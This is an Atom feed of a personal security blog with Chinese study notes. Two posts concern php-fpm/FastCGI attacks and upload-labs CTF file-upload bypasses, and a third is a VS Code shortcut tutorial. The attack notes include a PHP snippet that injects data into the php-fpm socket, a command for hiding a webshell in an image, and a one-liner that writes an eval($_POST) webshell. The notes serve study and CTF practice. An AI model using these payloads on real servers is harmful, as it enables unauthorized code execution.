<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Wendell&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.wendelltong.xyz/"/>
  <updated>2019-09-20T15:31:00.000Z</updated>
  <id>http://blog.wendelltong.xyz/</id>
  
  <author>
    <name>Wendell</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fastgci攻击姿势</title>
    <link href="http://blog.wendelltong.xyz/fastgci.html"/>
    <id>http://blog.wendelltong.xyz/fastgci.html</id>
    <published>2019-09-20T12:27:33.000Z</published>
    <updated>2019-09-20T15:31:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>学习笔记.</p><a id="more"></a><h1 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h1><p><img src="/../images/fastgci/image-20190920203708226.png" alt="image-20190920203708226"></p><p>CGI（Common Gateway Interface）全称是“通用网关接口”,它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序</p><p>FastCGI 是CGI协议的优化版,提高了CGI的性能,对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p><p>FastCGI的工作原理如下：<img src="/../images/fastgci/image-20190920205100811.png" alt="image-20190920205100811"></p><h1 id="php-的连接方式"><a href="#php-的连接方式" class="headerlink" title="php 的连接方式"></a>php 的连接方式</h1><h2 id="apche2-module"><a href="#apche2-module" class="headerlink" title="apche2-module"></a>apche2-module</h2><p>把 php 当做 apache 的一个模块，实际上 php 就相当于 apache 中的一个 dll 或一个 so 文件</p><h2 id="CGI-模式"><a href="#CGI-模式" class="headerlink" title="CGI 模式"></a>CGI 模式</h2><p>此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web 服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给 cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web 服务器返回到客户端</p><h2 id="FastCGI-模式"><a href="#FastCGI-模式" class="headerlink" title="FastCGI 模式"></a>FastCGI 模式</h2><p>fastcgi 本身还是一个协议，在 cgi 协议上进行了一些优化,fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache 去主动调用 php-cgi，而 fastcgi 进程又提供了很多辅助功能比如内存管理，垃圾处理，保障了 cgi 的高效性，并且 CGI 此时是常驻在内存中，不会每次请求重新启动<br>PHP-FPM 就是实现和管理 fastcgi 协议的进程</p><p>ginx 与 php-fpm 通信可以通过两种模式</p><ul><li>TCP 模式<br>TCP 模式即是 php-fpm 进程会监听本机上的一个端口(默认 9000)，然后 nginx 会把客户端数据通过 fastcgi 协议传给 9000 端口，php-fpm 拿到数据后会调用 cgi 进程解析</li><li>unix 套接字 (socket) 模式<br>它是 unix 系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为 socket 的唯一标识（描述符），需要通信的两个进程引用同一个 socket 描述符文件就可以建立通道进行通信了。</li></ul><h1 id="phpcgi-产生的问题"><a href="#phpcgi-产生的问题" class="headerlink" title="phpcgi 产生的问题"></a>phpcgi 产生的问题</h1><ul><li>除 disable_function 以外的大部分 php 配置，都可以在fastcgi协议包里面更改</li></ul><h2 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h2><p>tcp模式默认使用9000端口<br>如果9000被暴露在公网则可以直接访问,导致命令执行</p><p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php,</p><p>通过 auto_prepend_file,php://input 则可以执行任意代码</p><p>需要注意的是在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions：,要求必须伪.php后缀,才会执行<br>所有需要猜解web目录,如果无法得到web的目录,我们可以找找默认源安装后可能存在的php文件，比如/usr/local/lib/php/PEAR.php。</p><h2 id="SSRF-Gopher"><a href="#SSRF-Gopher" class="headerlink" title="SSRF+Gopher"></a>SSRF+Gopher</h2><p>如果目标网站存在ssrf漏洞,则可以通过 SSRF利用Gopher协议 来攻击 php-fpm</p><h2 id="攻击套接字"><a href="#攻击套接字" class="headerlink" title="攻击套接字"></a>攻击套接字</h2><p>上述都是tcp模式下的wen’t问题,如果目标网站采用了socket的链接方式,则可以通过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$sock=stream_socket_client(<span class="string">'unix:///run/php/php7.3-fpm.sock'</span>);</span><br><span class="line">fputs($sock, base64_decode($_POST[<span class="string">'A'</span>]));</span><br><span class="line">var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>进行攻击,不过需要可以进行代码执行,可能只能改改脚本不能改的配置吧,像open_basedir之类的,disable_function是不能改的,disable_function的绕过下次再说吧<br>或者攻击另一个服务器??</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/186186#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186#h2-7</a></p><p><a href="https://forum.90sec.com/t/topic/129" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/129</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#_1" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#_1</a></p><p><a href="https://xz.aliyun.com/t/5006" target="_blank" rel="noopener">https://xz.aliyun.com/t/5006</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习笔记.&lt;/p&gt;
    
    </summary>
    
      <category term="杂乱" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82%E4%B9%B1/"/>
    
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="中间件" scheme="http://blog.wendelltong.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.wendelltong.xyz/Untitled.html"/>
    <id>http://blog.wendelltong.xyz/Untitled.html</id>
    <published>2019-08-06T09:23:26.000Z</published>
    <updated>2019-08-06T09:23:26.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>upload总结</title>
    <link href="http://blog.wendelltong.xyz/Ctf_web/upload.html"/>
    <id>http://blog.wendelltong.xyz/Ctf_web/upload.html</id>
    <published>2019-07-28T15:20:02.000Z</published>
    <updated>2019-08-17T02:10:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>upload-labs</p><a id="more"></a><h1 id="不安全的检查"><a href="#不安全的检查" class="headerlink" title="不安全的检查"></a>不安全的检查</h1><ul><li>前端js</li><li>Content-Type绕过</li></ul><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><ul><li>可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</li></ul><p>​    AddType application/x-httpd-php .php .phtml .phps .php5 .pht</p><ul><li>上传<code>.htaccess</code>，实现重写文件解析,</li></ul><filesmatch "gg.jpg"><br>SetHandler application/x-httpd-php<br></filesmatch>    <p>同样这样的前提也是得在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><ul><li><p>未trim</p><p>尾部加空格绕过</p></li><li><p>::$DATA绕过</p><p>window流文件特性</p><p><a href="https://c1h3ng.github.io/web/2018/06/19/windows-tricks/" target="_blank" rel="noopener">https://c1h3ng.github.io/web/2018/06/19/windows-tricks/</a></p></li><li><p>未deldot</p><p>尾部加.绕过</p></li><li><p>./</p><ul><li>1.php./ ./被忽略</li><li>x/../1.php./ 可以实现文件覆写</li></ul></li></ul><h1 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h1><ul><li>%00截断<ul><li>get下%00</li><li>post下修改00字节</li><li>file截断目录</li></ul></li></ul><h2 id="解析漏洞绕过"><a href="#解析漏洞绕过" class="headerlink" title="解析漏洞绕过"></a>解析漏洞绕过</h2><h3 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h3><p>IIS 6.0解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><p>/xxx.asa<br>/xxx.cer<br>/xxx.cdx<br>/xxx.apsx</p><h3 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h3><p>在正常图片URL后添加 /.php，可以解析为php</p><p>###Apache<br>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>最近在出题的时候在apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了，真尴尬。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx &lt;8.03畸形解析漏洞<br>直接在正常图片URL后添加/.php<br>Nginx &lt;=0.8.37<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><h2 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h2><ul><li><p>phar，zip等伪协议</p></li><li><p>各种函数获取图片信息</p><p>图片马制作</p><p>copy normal.jpg /b + shell.php /a webshell.jpg</p></li><li><p>对图片进行二次编译</p><ul><li>寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分</li></ul></li><li><p>条件竞争</p><ul><li><p>这里可以使用burp去发包，可以把文件内容改成下面这样</p><figure class="highlight plain"><figcaption><span>$c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">或者这样，反正就是为了写文件进去就对了</span><br><span class="line"></span><br><span class="line">```&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd]?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;upload-labs&lt;/p&gt;
    
    </summary>
    
      <category term="安全" scheme="http://blog.wendelltong.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="ctf" scheme="http://blog.wendelltong.xyz/tags/ctf/"/>
    
      <category term="upload" scheme="http://blog.wendelltong.xyz/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>vs code 使用教程</title>
    <link href="http://blog.wendelltong.xyz/Ctf_web/vc%20code%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html"/>
    <id>http://blog.wendelltong.xyz/Ctf_web/vc code使用教程.html</id>
    <published>2019-07-28T15:20:02.000Z</published>
    <updated>2019-08-08T14:33:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>vs code 使用教程</p><a id="more"></a><h1 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h1><p>黑苹果对应mac的键(</p><p>Ctrl —cmd</p><p>Win-ctrl</p><p>Alt-option</p><p>)</p><p><img src="/Ctf_web/../../images/vc code使用教程/image-20190807173222289.png" alt="image-20190807173222289"></p><h1 id="基础理论"><a href="#基础理论" class="headerlink" title="基础理论"></a>基础理论</h1><h2 id="学习编辑器-在学什么"><a href="#学习编辑器-在学什么" class="headerlink" title="学习编辑器,在学什么"></a>学习编辑器,在学什么</h2><ul><li>学习编程语言举例<ul><li>​    开始,不熟悉编程语言,找一本官方手册,事无巨细的学习一遍,</li><li>掌握后,学习新的编程语言,不能同第一遍一样,<ul><li>其实编程语言在设计上大同小异，新的编程语言往往都是在解决老的语言的某一个短板，但他们在最本质的设计上不会有大的变化</li></ul></li></ul></li><li>学习编辑器<ul><li>你关心的应该是它能用来做什么，它最擅长做什么，以及它做不了什么，就是这个工具的“下限”和“上限”。</li><li><strong>首先，我们一起来找下编辑器或者 IDE 的“下限”</strong>。<ul><li><strong>快捷键的选用</strong><ul><li>VS Code 的做法是搭配组合辅助键 Ctrl、Alt 和 Meta 键，然后根据当前用户正在使用的组件来决定是什么功能</li><li>Vim 则是运用了“模态”的概念，把输入文本信息，和光标移动、文本操作等分开为不同的模态，不同模态各有一套自己的快捷键。</li></ul></li><li><strong>编程语言与框架支持</strong></li><li><strong>对工作流的选择和支持</strong></li></ul></li><li><strong>说完“下限”，我们再接着来说说编辑器的“上限”</strong>。<ul><li>编辑器支持用户写插件来定制功能，那它的“上限”就很高了</li><li>但扩展编辑器这个事情，由于最终还是要落实到社区和个人，真正能达到的高度就很难说了。<ul><li>Eclipse 插件开发语言 Java,插件运行在主进程中,插件影响ide性能</li><li>Atom VS code -语言是JavaScript</li><li>Emacs插件适Lisp,Vim是VimL</li></ul></li></ul></li><li>三步走的演变过程<ul><li>最开始的时候，我特别关心快捷键和语言支持，在这上面花了很多时间，这个过程就像是打怪升级，不断更新自己的装备库；</li><li>再往后，我就会开始挑剔编辑器的其他组件，但凡是跟自己的工作习惯或者工作流不匹配的，就会想办法换掉它，这是个做减法的过程；</li><li>最后一步，就是自己学习写插件了，编辑器本身的功能和社区不能够完全满足自己的需求，本着“麻烦别人不如磨炼自己”的精神，我开始自己动手。</li></ul></li></ul></li></ul><h2 id="vs-code-why-how-what"><a href="#vs-code-why-how-what" class="headerlink" title="vs code why,how,what"></a>vs code why,how,what</h2><ul><li><p>定位:编辑器,但又不局限与此</p></li><li><p>设计思路</p><ul><li>vs code 的发展轨迹<ul><li>2011 年底，微软从 IBM 请来了 Erich Gamma,希望他能够打造一款在线的开发工具，让开发者们能够在浏览器里获得 IDE 般的开发体验2015 年，Erich Gamma 带领团队把 Monaco Editor 移植到桌面平台上，也就是这个专栏的主角 Visual Studio Code，即 VS Code。</li></ul></li><li>开源与开放的平台<ul><li><strong>首先，VS Code 的源代码以 MIT 协议开源</strong></li><li><strong>其次，开发过程和反馈渠道的开放</strong>。</li><li><strong>再次，接口的开放</strong></li></ul></li></ul></li><li><p>VS Code 学习指南</p><ul><li>核心编辑器的使用。</li><li>工作台、工作区的使用</li><li>VS Code 定制和插件开发。</li></ul><h2 id="上手vs-code"><a href="#上手vs-code" class="headerlink" title="上手vs code"></a>上手vs code</h2></li><li><p>“学习”区域的三个功能：</p><ul><li><p>命令 面板</p><ul><li>Cmd+Shift+P 或 F1</li><li>命令面板中快速搜索命令并且执行,,绝大多数命令都可以在命令面板里搜到</li></ul></li><li><ol start="2"><li>界面概览</li></ol><ul><li>VS Code 默认界面里的不同部件的位置、名称和快捷键。</li></ul></li><li><ol start="3"><li>交互式演习场</li></ol><ul><li>全英文的初学者教程</li></ul></li></ul></li><li><p>命令行的使用</p><ul><li>安装后打开命令面板，搜索<code>Shell 命令：在 PATH 中安装 “Code” 命令</code>并执行，然后重启终端模拟就可以了。</li><li>code —help  显示帮助<ul><li>最基本的命令行使用方式是在 <code>code</code> 命令后加上文件或者文件夹的地址，这样VS Code 就会在一个新窗口中打开这个文件或文件夹。,如果希望使用已打开的窗口打开,加上-r参数</li><li>参数 <code>-g &lt;file:line[:character]&gt;</code> 打开文件，然后滚动到文件中某个特定的行和列，比如输入 <code>code -r -g package.json:128</code>命令，你就可以打开 package.json 这个文件，然后自动跳转到 128 行,可以用于错误定位</li><li>只需使用 <code>-d</code>参数，并传入两个文件路径，比如输入 <code>code -r -d a.txt b.txt</code>命令，就可以比较a.txt和b.txt两个文件的内容了</li><li>也接受来自管道中的数据,此时只需使用<code>ls | code -</code>命令</li></ul></li></ul></li></ul><h2 id="如何双手不离开键盘"><a href="#如何双手不离开键盘" class="headerlink" title="如何双手不离开键盘"></a>如何双手不离开键盘</h2><h3 id="键盘操作：光标的移动、文本的选择、文本的删除，以及如何为编辑器命令绑定快捷键"><a href="#键盘操作：光标的移动、文本的选择、文本的删除，以及如何为编辑器命令绑定快捷键" class="headerlink" title="键盘操作：光标的移动、文本的选择、文本的删除，以及如何为编辑器命令绑定快捷键"></a>键盘操作：<strong>光标的移动、文本的选择、文本的删除，以及如何为编辑器命令绑定快捷键</strong></h3><ul><li>光标的移动<ul><li><strong>针对单词的光标移动</strong><ul><li>一个单词一个单词的移动,</li><li>光标直接移动到整个单词的前面,Option(alt)（Windows 上是 Ctrl 键）和左方向键。相反，如果要把光标移动到单词的末尾，只需要按下 Option 和右方向键就好了。</li></ul></li><li><strong>第二种方式是把光标移动到行首或者行末</strong><ul><li>使用cmd(ctrl)键,左右方向键,window上是home和end键</li></ul></li><li><strong>对于代码块的光标移动</strong><ul><li>Cmd + Shift + \（Windows 上是 Ctrl + Shift + \），就可以在这对花括号之间跳转。</li></ul></li><li><strong>移动到文档的第一行或者最后一行</strong><ul><li>Cmd 和上下方向键即可（Windows 上是 Ctrl + Home/End 键）</li></ul></li></ul></li><li>文本选择<ul><li>你只需要多按一个 Shift 键，就可以在移动光标的同时选中其中的文本。</li></ul></li><li>删除操作<ul><li>先选中,在按删除键</li><li>Cmd 和 Backspace(Delete),删除左侧(右侧)所有内容</li><li>option和 Backspace(Delete),删除左侧(右侧)单词</li><li>按下 “ Cmd + Shift + K ” (Windows 上是 “Ctrl + Shift + K”)，当前代码行就可以被删除了。</li></ul></li><li>剪贴<ul><li>剪切代码 Cmd + x ” (Windows 上是 “Ctrl + x”) 即可</li></ul></li><li>自定义快捷键</li></ul><h3 id="快捷键进阶"><a href="#快捷键进阶" class="headerlink" title="快捷键进阶"></a>快捷键进阶</h3><ul><li>代码行编辑。<ul><li>你想在当前行的下面新开始一行时，你只需按下 “Cmd + Enter” （Windows 上是 “Ctrl + Enter”）；而当你想在当前行的上面新开始一行时，你只要按下 “Cmd + Shift + Enter” （Windows 上是 “Ctrl + Shift + Enter”）就行了。</li><li>移动一段代码时，一般你可能会分三步走：先选中，再剪切，最后粘贴。不过我更喜欢的是按住 “Option + 上下方向键”（Windows中就是“Alt + 上下方向键”） ，将当前行，或者当前选中的几行代码，在编辑器里上下移动。</li></ul></li><li>编程语言相关命令<ul><li>添加注释<ul><li>注释一行代码 Cmd + / ” （Windows 上时 “Ctrl + /”）</li><li>如果你需要把一整段代码注释掉，按下 “ Option + Shift + A”即可。</li></ul></li><li>代码格式化<ul><li>Option + Shift + F” （Windows 上是 Alt + Shift + F）来对整个文档进行格式</li><li>也可以选中一段代码，然后按下 “Cmd + K Cmd + F” （Windows 上是 Ctrl + K Ctrl + F），对选中代码格式化</li></ul></li><li>代码缩进<ul><li>搜索 “缩进”，然后使用 “重新缩进行” 将整个文档的缩进进行调整，但更多时候，你只需要运行 “重新缩进选中行” 来调整部分选中代码行的缩进。</li></ul></li><li>其他<ul><li><strong>第一个是调换字符的位置</strong>。你可以按下 “Ctrl + t” （Windows 上未绑定快捷键，可以打开命令面板，搜索 ”转置游标处的字符“） 来把当前光标前后的字符调换位置。</li><li><strong>第二个是调整字符的大小写</strong>，我估计这个你会经常用到。你可以选中一串字符，然后在命令面板里运行“转换为大写”或 “转换为小写”, 来变换字符的大小写。</li><li><strong>第三个是合并代码行</strong>。有的时候你可能会为了避免代码看起来过于冗余，就会把比较短小的几行代码合并到一行里面去。这时，你只需要按下 “ Ctrl + j ” </li><li><strong>第四个是行排序</strong>。无论是你在写代码，还是写 Markdown，你都可以把代码行按照字母序进行重新排序。不过这个命令比较小众，VS Code 并没有给这个命令指定快捷键，你可以调出命令面板，然后搜索 “按升序排列行” 或者 “按降序排列行” 命令执行。</li><li><strong>第五个是撤销光标的移动和选择</strong>。有的时候你移动完光标之后，又希望把光标回退到上一个位置，这时你只需按下 “Cmd + U”（Windows 上是 “Ctrl + U”），就可以撤销这一次光标的移动。</li></ul></li></ul></li></ul><h3 id="多光标特性"><a href="#多光标特性" class="headerlink" title="多光标特性"></a>多光标特性</h3><ul><li><p>创建多个光标</p><ul><li>第一种添加多光标的方式，就是使用鼠标。在键盘上按住 “Option”（Windows 上是 Alt），然后鼠标点在第二个“5”之前，那么第二个光标就创建好了</li><li>使用键盘<ul><li>Cmd + Option + 下方向键”（Windows 上是 “Ctrl + Alt + 下方向键”），在当前光标的下面创建一个光标</li><li>按下 “Cmd + 右方向键”（Windows 上是 End），这样它们就都移动到每一行的末尾了。</li></ul></li></ul></li><li><p>创建多光标的两个特别的命令</p><ul><li><h3 id="1-“Cmd-D”"><a href="#1-“Cmd-D”" class="headerlink" title="1. “Cmd + D”"></a>1. “Cmd + D”</h3></li><li><p>你把光标移动到数字“5”之前，按下 “Cmd + D”，这样第一个“5”就被选中了；然后再按一次 “Cmd + D”（Windows 上是 Ctrl + D），你可以看到，第二个“5”也被选中了。</p></li><li><h3 id="2-Option-Shift-i"><a href="#2-Option-Shift-i" class="headerlink" title="2. Option + Shift + i"></a>2. Option + Shift + i</h3><p>首先你选择多行代码，然后按下 “Option + Shift + i” （Windows 上是 Alt + Shift + i），这样操作的结果是：每一行的最后都会创建一个新的光标</p></li></ul></li><li><p>如何快速在文件,符号和代码之间跳转</p><ul><li>文件跳转<ul><li>“Ctrl+Tab”，(alt )键然后继续按着 “Ctrl”键但是松开 “Tab” 键，这样你就可以打开一个文件列表，这个列表罗列了当前打开的所有文件。接下来，你可以通过按下 “Tab”键在这个列表里跳转，选择你想要打开的文件。最后选到你想打开的文件后，松开 “Ctrl” 键，这个文件就被打开了</li><li>“Cmd + P” （Windows 上是 Ctrl + P）时，就会跳出一个最近打开文件的列表，同时在列表的顶部还有一个搜索框,,找到文件后,按Cmd + Enter ” （Windows 上是 Ctrl + Enter）组合键文件在一个新的编辑器</li></ul></li><li>行跳转<ul><li>文件内跳转:按下 “Ctrl + g”，调出行输入框,输入行号跳转</li><li>其他文件的某一行:先按下 “Cmd + P”，输入文件名，然后在这之后加上 “:”和指定行号即可</li></ul></li><li>符号跳转<ul><li>跳转到文件里的类定义，或者函数定义的位置<ul><li>符号之间跳转，你只需按下 “Cmd + Shift + O” </li><li>:对符号进行分类</li><li>如果你打开了多个 JavaScript 文件，就可以按下 “Cmd + T” （Windows 上是 Ctrl + T），搜索这些文件里的符号。</li></ul></li></ul></li><li>定义 (Definition) 和实现 (implementation) 跳转<ul><li>按下 F12，就可以跳转到函数的定义处。</li><li>“Cmd + F12” （Windows 上是 Ctrl + F12），跳转到函数的实现的位置</li></ul></li><li>引用 (Reference) 跳转<ul><li>Shift + F12(alt+f12)</li></ul></li><li>Cmd - (win -)跳转回到原来位置</li></ul></li></ul><h3 id="玩转鼠标操作"><a href="#玩转鼠标操作" class="headerlink" title="玩转鼠标操作"></a>玩转鼠标操作</h3><ul><li>文本选择<ul><li>在VS Code中，你单击鼠标左键就可以把光标移动到相应的位置。而双击鼠标左键，则会将当前光标下的单词选中。连续三次按下鼠标左键，则会选中当前这一行代码。最后是连续四次按下鼠标左键，则会选中整个文档。</li><li>如果你单击行号，就能够直接选中这一行。如果你在某个行号上按下鼠标，然后上下移动，则能够选中多行代码。</li></ul></li><li>文本编辑<ul><li>选中 <code>bar</code> 这个函数，然后将鼠标移到这段选中的代码之上，按下鼠标左键不松开。这时你可以看到，鼠标指针已经从一条竖线，变成了一个箭头。这时候我们移动鼠标的话，就可以把这段文本拖拽到我们想要的位置。</li><li>移动鼠标的过程中，多按了个 Option 键（Windows 上是 Ctrl 键），操作结果就由原来的“剪切+粘贴”变为“复制+粘贴”了</li></ul></li><li>多光标<ul><li>按住 Option 键，然后哪里需要点哪里</li><li>你只需按下鼠标中键，然后对着一段文档拖出一个框，在这个框中的代码就都被选中了，而且每一行被选中的代码，都拥有一个独立的光标。</li></ul></li><li>悬停提示窗口</li><li>代码跳转和链接<ul><li>然后按下 Cmd 键，这时候 <code>foo</code>下面出现了一个下划线。然后当我们按下鼠标左键，就跳转到了 <code>foo</code>函数的定义处。</li><li>编写 Markdown 这样的非编程语言的文档时，也可以通过 Cmd + 鼠标左键（Windows 上是 Ctrl + 鼠标左键）来打开超级链接。</li><li>Cmd - 跳转回到原来位置</li></ul></li></ul><h1 id="功能的核心"><a href="#功能的核心" class="headerlink" title="功能的核心"></a>功能的核心</h1><h2 id="代码自动补全和重构"><a href="#代码自动补全和重构" class="headerlink" title="代码自动补全和重构"></a>代码自动补全和重构</h2><h4 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h4><ul><li>Tab 键或者回车键就可以将其补全。</li><li>可以按下 Escape()esc 键将其隐藏。后续如果希望再次看到这个窗口，除了通过打字来将其调出以外，我们还可以按下 “Ctrl + 空格键”来手动地调出建议列表</li></ul><h4 id="快速预览"><a href="#快速预览" class="headerlink" title="快速预览"></a>快速预览</h4><ul><li>Ctrl+空格键”组合键来快速调出这个快速预览窗口。</li><li>鼠标点蓝色感叹号</li></ul><h4 id="参数预览"><a href="#参数预览" class="headerlink" title="参数预览"></a>参数预览</h4><ul><li>“Cmd + Shift + Space</li></ul><h4 id="自动补全设置"><a href="#自动补全设置" class="headerlink" title="自动补全设置"></a>自动补全设置</h4><ul><li>先我们可以通过设置 “editor.quickSuggestions” 来决定在什么语境下自动补全窗口会被唤出</li><li>参数预览窗口也是一样的，你可以通过参数 “editor.parameterHints.enabled”</li><li>增大设置 “editor.quickSuggestionsDelay” 的值，这样在你输入完代码后，自动补全窗口就会多等一会儿，然后再跳出来。</li><li>其他几个自动补全的设置，你可以在设置里搜一搜 “editor.suggest”，自己修改玩一玩。</li></ul><h4 id="快速修复"><a href="#快速修复" class="headerlink" title="快速修复"></a>快速修复</h4><p>按下 “Cmd+.” （Windows 上是 Ctrl + . ）来调出这个快速修复的建议列表</p><h4 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h4><ul><li>只需把光标放到函数或者变量名上，然后按下ctrl- F2，这样这个函数或者变量出现的地方就都会被修改</li><li>另一个常用的重构的操作就是把一段长代码抽取出来转成一个单独的函数。在VS Code中，我们只需选中那段代码，点击黄色的灯泡图标，然后选择对应的重构操作即可。</li></ul><h4 id="单词自动补全"><a href="#单词自动补全" class="headerlink" title="单词自动补全"></a>单词自动补全</h4><ul><li>editor.wordBasedSuggestions</li></ul><h2 id="代码片段（code-snippet）"><a href="#代码片段（code-snippet）" class="headerlink" title="代码片段（code snippet）"></a><strong>代码片段（code snippet）</strong></h2><blockquote><p>代码片段是对常用代码的一个抽象，它保留了大部分不变的代码，然后把需要经常变动的部分，换成变量，这样等下次调用它的时候，只需要把这些变量换成我们需要的就可以了。</p></blockquote><ul><li><p>搜索“配置用户代码片段”（Configure User Snippets）并且执行。这时候我们会看到一个列表，让我们选择语言。这里我们依然选择 JavaScript 作为我们的示例语言</p></li><li><p>我们可以选中第七行到第十四行，按下 “Cmd+ /”取消注释。</p><ul><li>你已经看到了，这个代码片段文件，是一个 JSON 文件，它的根对象下面的所有子节点都是一个单独的代码片段，并能够被我们调用和插入编辑器。这个代码片段对象的键（key）是这个代码片段的名字，我们在书写时只要保证这个名字跟当前文件里的其他代码片段不冲突就可以了。</li></ul></li><li><h2 id="Tab-Stop"><a href="#Tab-Stop" class="headerlink" title="Tab Stop"></a>Tab Stop</h2><ul><li>内容里 的<code>$1</code>和 <code>$2</code>不见了，取而代之的是两个竖线。这<code>$1</code>和 <code>$2</code>就是 Tab Stop，意思是，当我们按下 Tab 键之后，光标移动到的位置。当这段代码片段被插入到编辑器后，编辑器会把光标移动到<code>$1</code>所在的位置，然后如果你再按一次 Tab 键，光标则会立刻移动到 <code>$2</code>的位置。</li></ul></li><li><p>占位符</p><p>在我们插入 Tab Stop 的时候，除了 <code>$1</code>、 <code>$2</code> 这样的语法，我们还可以填入 <code>${1:label}</code>，在这个格式下，代码片段被插入编辑器里时，$1 的位置处，会预先填入 <code>label</code>这个值，并且 <code>label</code> 会被选中。</p></li><li><h2 id="多光标"><a href="#多光标" class="headerlink" title="多光标"></a>多光标</h2><ul><li>${1:label} 来指定 Tab Stop 和占位符，但其实我们也可以在代码片段的多个位置使用同样的 Tab Stop 。</li></ul></li><li><h2 